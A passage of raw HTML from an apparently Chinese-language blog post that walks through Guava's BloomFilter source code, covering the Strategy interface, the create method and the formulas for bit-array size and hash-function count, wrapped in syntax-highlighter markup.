class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb34835679208-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb34835679208-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-1\"><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-r\">extends</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">Serializable</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-4\"><span class=\"crayon-c\">     * Sets {@ code numHashFunctions} bits of the given bit array, by hashing a user element.</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-5\"><span class=\"crayon-c\">     *</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-6\"><span class=\"crayon-c\">     * &lt;p&gt;Returns whether any bits changed as a result of this operation.</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-7\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-11\"><span class=\"crayon-c\">     * Queries {@ code numHashFunctions} bits of the given bit array, by hashing a user element;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-12\"><span class=\"crayon-c\">     * returns {@ code true} if and only if all selected bits are set.</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-13\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-18\"><span class=\"crayon-c\">     * Identifier used to encode this strategy, when marshalled as part of a BloomFilter. Only</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-19\"><span class=\"crayon-c\">     * values in the [-128, 127] range are valid for the compact serial form. Non-negative values</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-20\"><span class=\"crayon-c\">     * are reserved for enums defined in BloomFilterStrategies; negative values are reserved for any</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-21\"><span class=\"crayon-c\">     * custom, stateful strategy we may define (e.g. any kind of strategy that would depend on user</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-22\"><span class=\"crayon-c\">     * input).</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-23\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb34835679208-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ordinal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb34835679208-25\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>对于创建布隆过滤器，BloomFilter并没有公有的构造函数，只有一个私有构造函数，而对外它提供了5个重载的create方法，在缺省情况下误判率设定为3%，采用BloomFilterStrategies.MURMUR128_MITZ_64的实现。其中4个create方法最终都调用了同一个create方法，由它来负责调用私有构造函数，其源码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb39118213076\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic &lt;T&gt; BloomFilter&lt;T&gt; create(\r\n      Funnel&lt;? super T&gt; funnel, long expectedInsertions, double fpp, Strategy strategy) {\r\n    checkNotNull(funnel);\r\n    checkArgument(\r\n        expectedInsertions &gt;= 0, \"Expected insertions (%s) must be &gt;= 0\", expectedInsertions);\r\n    checkArgument(fpp &gt; 0.0, \"False positive probability (%s) must be &gt; 0.0\", fpp);\r\n    checkArgument(fpp &lt; 1.0, \"False positive probability (%s) must be &lt; 1.0\", fpp);\r\n    checkNotNull(strategy);\r\n\r\n    if (expectedInsertions == 0) {\r\n      expectedInsertions = 1;\r\n    }\r\n    /*\r\n     * TODO(user): Put a warning in the javadoc about tiny fpp values, since the resulting size\r\n     * is proportional to -log(p), but there is not much of a point after all, e.g.\r\n     * optimalM(1000, 0.0000000000000001) = 76680 which is less than 10kb. Who cares!\r\n     */\r\n    long numBits = optimalNumOfBits(expectedInsertions, fpp);\r\n    int numHashFunctions = optimalNumOfHashFunctions(expectedInsertions, numBits);\r\n    try {\r\n      return new BloomFilter&lt;T&gt;(new BitArray(numBits), numHashFunctions, funnel, strategy);\r\n    } catch (IllegalArgumentException e) {\r\n      throw new IllegalArgumentException(\"Could not create BloomFilter of \" + numBits + \" bits\", e);\r\n    }\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb39118213076-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb39118213076-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-2\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkNotNull</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Expected insertions (%s) must be &gt;= 0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"False positive probability (%s) must be &gt; 0.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"False positive probability (%s) must be &lt; 1.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkNotNull</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-14\"><span class=\"crayon-c\">     * TODO(user): Put a warning in the javadoc about tiny fpp values, since the resulting size</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-15\"><span class=\"crayon-c\">     * is proportional to -log(p), but there is not much of a point after all, e.g.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-16\"><span class=\"crayon-c\">     * optimalM(1000, 0.0000000000000001) = 76680 which is less than 10kb. Who cares!</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-17\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfBits</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfHashFunctions</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-21\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">numBits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">IllegalArgumentException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-23\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">throw</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IllegalArgumentException</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Could not create BloomFilter of \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" bits\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb39118213076-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb39118213076-25\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<p><!-- [Format Time: 0.0060 seconds] --></p>\n<p>在create中接受了4个参数，funnel（输入的数据），expectedInsertions（预计插入的元素总数），fpp（期望误判率），strategy（实现Strategy的实例），然后它计算了bit数组的长度以及哈希函数的个数（公式参考前文），最后用numBits创建了BitArray，并调用了构造函数完成赋值操作。</p>\n<p><!-- Crayon Syntax Highlighter v_2.7.2_beta --></p>\n<div id=\"crayon-5a446fa247293650434407\">\n<div>\n<div>\n<div title=\"Toggle Line Wrap\">\n<div title=\"Toggle Line Numbers\">\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb3d815322548\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic long optimalNumOfBits(long n, double p) {\r\n    if (p == 0) {\r\n      p = Double.MIN_VALUE;\r\n    }\r\n    return (long) (-n * Math.log(p) / (Math.log(2) * Math.log(2)));\r\n  }\r\n\r\nstatic int optimalNumOfHashFunctions(long n, long m) {\r\n    // (m / n) * log(2), but avoid truncation due to division!\r\n    return Math.max(1, (int) Math.round((double) m / n * Math.log(2)));\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb3d815322548-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb3d815322548-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb3d815322548-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb3d815322548-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb3d815322548-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb3d815322548-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div 